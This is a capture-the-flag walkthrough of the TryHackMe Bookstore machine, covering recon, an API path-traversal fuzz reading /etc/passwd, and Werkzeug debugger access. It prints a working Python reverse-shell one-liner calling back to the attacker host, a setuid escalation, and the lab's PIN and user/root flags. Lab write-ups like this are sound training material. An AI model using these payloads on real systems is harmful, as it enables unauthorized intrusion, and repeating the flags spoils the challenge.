# TryHackMe - Bookstore Penetration Testing Writeup

This document provides a detailed writeup on the penetration test performed on the Bookstore machine hosted on TryHackMe.

## **1. Initial Reconnaissance**

The first step of any penetration test is an initial scan to determine what services are running.

```bash
root@ip-10-10-183-17:~# nmap -sC -sV 10.10.14.108 
```

The key findings from the scan are:

- SSH (port 22) is open.
- HTTP (port 80) is serving an Apache server.
- Another HTTP instance (port 5000) is identified as the Werkzeug httpd, with an exposed API endpoint `/api`.

## **2. Web Enumeration**

Upon visiting the website at:

- `http://10.10.14.108`
- `http://10.10.14.108/books`
- `http://10.10.14.108/login`

We discovered interesting information:

- Source code of `/books` revealed an API call endpoint.
- A comment hinting at a version vulnerability in the API.
- The `/login` page had a development comment, indicating the presence of a debugger PIN in sid's bash history file.

To further uncover the directories and files, we used `gobuster`:

```bash
root@ip-10-10-183-17:~# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.14.108:5000
```

Discoveries:

- `/api` exposed API documentation.
- `/console` revealed the Werkzeug Debugger Console, but it required a PIN.

## **3. API Exploitation**

An exploration of the API exposed potential endpoints. To identify vulnerabilities, we fuzzed the API:

```bash
root@ip-10-10-183-17:~# wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt -u http://10.10.14.108:5000/api/v1/resources/books?FUZZ=../../../../../etc/passwd --hc 404
```

This identified a potential local file disclosure vulnerability using the `show` parameter. Successfully exploiting it revealed the pin `123-321-135`.

## **4. Gaining Initial Access**

Utilizing the discovered PIN, we accessed the Werkzeug Debugger Console and executed the following command to obtain a reverse shell:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.183.17",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

From the obtained shell, we extracted the user flag:

```bash
sid@bookstore:~$ cat user.txt
4ea65eb80ed441adb68246ddf7b964ab
```

## **5. Privilege Escalation**

On the server, a setuid binary named `try-harder` was discovered. After a local disassembly and reverse engineering, it was determined that the program performs an XOR operation against specific inputs. Calculating the correct input granted us a root shell:

```bash
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1573743953
root@bookstore:~#
```

With escalated privileges, we extracted the root flag:

```bash
root@bookstore:~# cat /root/root.txt
e29b05fba5b2a7e69c24a450893158e3
```
